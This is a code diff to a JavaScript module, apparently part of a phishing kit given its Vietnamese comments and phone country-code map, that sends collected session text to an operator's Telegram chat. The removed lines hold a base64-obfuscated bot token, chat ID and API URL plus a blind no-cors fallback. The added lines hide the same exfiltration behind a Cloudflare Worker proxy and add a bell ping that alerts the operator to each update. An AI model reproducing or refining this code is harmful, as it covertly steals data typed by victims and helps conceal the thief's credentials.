@@ -1,9 +1,8 @@
-const _k1 = 'ODk2NTY2NzczMDpBQUVVbVE0bHJzWXhjazFBdWRhRFBLa1ZFZ0Z3QTZuV2hrYw==';
-const _k2 = 'LTUxODMwMDIxOTY=';
-const _k3 = 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==';
-
 let tgMessageId = null;
 let currentSessionText = '';
+
+// Thay cái link Worker của mày vào đây (Lấy ở Bước 1)
+const WORKER_URL = 'https://tg-api.ten-mien-cua-may.workers.dev';
 
 export const setInitialSession = (text) => { currentSessionText = text; };
 export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -11,63 +10,36 @@ export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, 
 export const sendTelegramMessage = (newContent) => {
     if (newContent) currentSessionText += newContent;
     const text = currentSessionText;
-    const decodedChatId = atob(_k2);
 
-    const tgFetch = (method, payload, isBlindFire) => {
-        const decodedUrl = atob(_k3) + atob(_k1) + '/' + method;
-        let bodyStr = '';
-        for (let key in payload) {
-            if (payload.hasOwnProperty(key)) {
-                bodyStr += encodeURIComponent(key) + '=' + encodeURIComponent(payload[key]) + '&';
-            }
-        }
-        const options = {
+    const sendToWorker = (method, payload) => {
+        return fetch(WORKER_URL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
-            body: bodyStr
-        };
-        if (isBlindFire) {
-            options.mode = 'no-cors'; 
-            fetch(decodedUrl, options).catch(()=>{});
-            return Promise.resolve({ ok: true, blind: true });
-        } else {
-            options.mode = 'cors';
-            const controller = new AbortController();
-            options.signal = controller.signal;
-            const timer = setTimeout(() => controller.abort(), 2000);
-            return fetch(decodedUrl, options)
-                .then(r => r.json())
-                .then(d => { clearTimeout(timer); return d; })
-                .catch(err => { clearTimeout(timer); return { ok: false, error: err }; });
-        }
-    };
-
-    const payload = {
-        chat_id: decodedChatId,
-        text: text,
-        parse_mode: 'HTML',
-        disable_web_page_preview: true
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                method: method,
+                text: payload.text,
+                message_id: payload.message_id
+            })
+        }).then(r => r.json()).catch(() => ({ ok: false }));
     };
 
     if (tgMessageId === null) {
-        tgFetch('sendMessage', payload, false).then(d => {
+        sendToWorker('sendMessage', { text }).then(d => {
             if (d && d.ok && d.result) tgMessageId = d.result.message_id; 
-            else tgFetch('sendMessage', payload, true);
         });
     } else {
-        tgFetch('sendMessage', { chat_id: decodedChatId, text: '🔔' }, false).then(res => {
+        // Gửi tin rác để kêu "Ting ting"
+        sendToWorker('sendMessage', { text: '🔔' }).then(res => {
             if (res && res.ok && res.result) {
-                tgFetch('deleteMessage', { chat_id: decodedChatId, message_id: res.result.message_id }, false);
+                sendToWorker('deleteMessage', { message_id: res.result.message_id });
             }
-            payload.message_id = tgMessageId;
-            tgFetch('editMessageText', payload, false).then(d => {
-                if (!d || !d.ok) tgFetch('editMessageText', payload, true);
-            });
+            // Cập nhật tin nhắn chính
+            sendToWorker('editMessageText', { text, message_id: tgMessageId });
         });
     }
 };
 
-// Bản đồ mã quốc gia 2 ký tự -> Mã vùng điện thoại
+// Bản đồ mã quốc gia (giữ nguyên như cũ)
 export const countryCodeMap = {
     "AF": "+93", "AL": "+355", "DZ": "+213", "AS": "+1", "AD": "+376", "AO": "+244", "AI": "+1", "AG": "+1", 
     "AR": "+54", "AM": "+374", "AW": "+297", "AU": "+61", "AT": "+43", "AZ": "+994", "BS": "+1", "BH": "+973", 
